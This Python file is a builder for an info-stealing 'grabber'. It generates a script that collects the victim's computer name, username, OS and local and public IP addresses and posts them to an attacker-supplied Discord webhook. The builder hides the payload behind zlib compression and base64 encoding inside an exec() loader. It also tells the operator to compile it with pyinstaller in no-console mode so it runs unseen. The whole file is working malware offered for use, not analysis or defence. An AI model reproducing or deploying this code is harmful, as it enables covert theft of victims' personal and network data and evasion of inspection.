import base64
import zlib
import textwrap

def generate_encrypted_payload(webhook_url):
    code = f'''import requests
import platform
import socket
from datetime import datetime

WEBHOOK_URL = "{webhook_url}"

def get_system_info():
    try:
        computer_name = platform.node()
        username = platform.getlogin() if hasattr(platform, 'getlogin') else 'Unknown'
        system = platform.system()
        release = platform.release()

        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        try:
            ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
            public_ip = ip_response.json().get('ip', 'Unknown')
        except:
            public_ip = "Unknown"

        return {{
            "Computer Name": computer_name,
            "Username": username,
            "OS": f"{{system}} {{release}}",
            "Local IP": local_ip,
            "Public IP": public_ip,
            "Timestamp": str(datetime.now())
        }}
    except Exception as e:
        return {{"Error": str(e)}}

def send_to_discord(info):
    content = "**System Information Report**\\n"
    for key, value in info.items():
        content += f"**{{key}}**: {{value}}\\n"

    try:
        requests.post(WEBHOOK_URL, json={{"content": content}}, timeout=5)
    except:
        pass

if __name__ == "__main__":
    info = get_system_info()
    send_to_discord(info)
'''

    # Compress and encode
    compressed = zlib.compress(code.encode())
    encoded = base64.b64encode(compressed).decode()

    loader_code = f'''
import base64
import zlib

payload_encoded = "{encoded}"

payload = zlib.decompress(base64.b64decode(payload_encoded)).decode()

exec(payload)
'''

    return loader_code.strip()

def main():
    print("Loaded succesfully!")
    webhook = input("Enter Discord webhook URL: ").strip()
    filename = input("Output filename (without .py): ").strip() or "grabber"

    code = generate_encrypted_payload(webhook)

    with open(f"{filename}.py", "w", encoding="utf-8") as f:
        f.write(code)

    print(f"Encrypted payload saved as {filename}.py")
    print(f"Compile with: pyinstaller --onefile --noconsole {filename}.py")

if __name__ == "__main__":
    main()